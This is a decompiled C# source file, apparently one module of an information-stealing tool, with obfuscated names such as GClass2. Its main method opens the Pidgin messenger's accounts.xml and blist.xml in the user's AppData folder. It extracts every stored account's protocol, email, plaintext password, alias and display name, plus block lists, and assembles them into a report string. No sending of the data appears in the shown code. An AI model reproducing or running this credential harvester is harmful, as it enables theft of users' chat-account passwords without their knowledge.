using System;
using System.IO;

// Token: 0x02000022 RID: 34
public class GClass2
{
	// Token: 0x06000084 RID: 132 RVA: 0x000020EB File Offset: 0x000002EB
	public GClass2()
	{
	}

	// Token: 0x06000085 RID: 133 RVA: 0x00005B80 File Offset: 0x00003D80
	private static string smethod_0(string string_0, string string_1, string string_2, int int_0)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			return string.Empty;
		}
		if (string_0.Contains(string_1))
		{
			string text = string_0.Substring(checked(string_0.IndexOf(string_1) + (string_1.Length + int_0)));
			if (text.Contains(string_2) && !string.IsNullOrEmpty(string_2))
			{
				text = text.Substring(0, text.IndexOf(string_2));
			}
			return text;
		}
		return string.Empty;
	}

	// Token: 0x06000086 RID: 134 RVA: 0x00005BE4 File Offset: 0x00003DE4
	public static object smethod_1()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
		string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple/blist.xml";
		string text = File.ReadAllText(path);
		string text2 = File.ReadAllText(path2);
		string[] separator = new string[]
		{
			"<account>"
		};
		string[] array = text.Split(separator, StringSplitOptions.None);
		string[] separator2 = new string[]
		{
			"<account"
		};
		string[] array2 = text2.Split(separator2, StringSplitOptions.None);
		string text3 = string.Empty;
		int num = 1;
		checked
		{
			int num2 = array.Length - 1;
			for (int i = num; i <= num2; i++)
			{
				string text4 = GClass2.smethod_0(array[i], "<protocol>", "</protocol>", 0).Replace("prpl-", string.Empty);
				string text5 = GClass2.smethod_0(array[i], "<name>", "</name>", 0);
				string text6 = GClass2.smethod_0(array[i], "<password>", "</password>", 0);
				string text7 = GClass2.smethod_0(array[i], "name='", "' active='true'", 0);
				string text8 = GClass2.smethod_0(array[i], "<alias>", "</alias>", 0);
				string text9 = GClass2.smethod_0(array[i], "<setting name='display-name' type='string'>", "</setting>", 0);
				string[] array3 = array2[i].Split(new char[]
				{
					'<'
				});
				string str = string.Empty;
				int num3 = 1;
				int num4 = array3.Length - 4;
				for (int j = num3; j <= num4; j += 2)
				{
					str = str + array3[j].Replace("block>", "Blocked - ").Replace("permit>", "Permit - ") + "\r\n";
				}
				text3 = string.Concat(new string[]
				{
					text3,
					"Protocol: ",
					text4,
					"\r\nEmail: ",
					text5,
					"\r\nPassword: ",
					text6,
					"\r\nLocal Alias: ",
					text8,
					"\r\nDisplay Name: ",
					text9,
					"\r\nLast Status: ",
					text7,
					"\r\n"
				});
			}
			return text3;
		}
	}
}
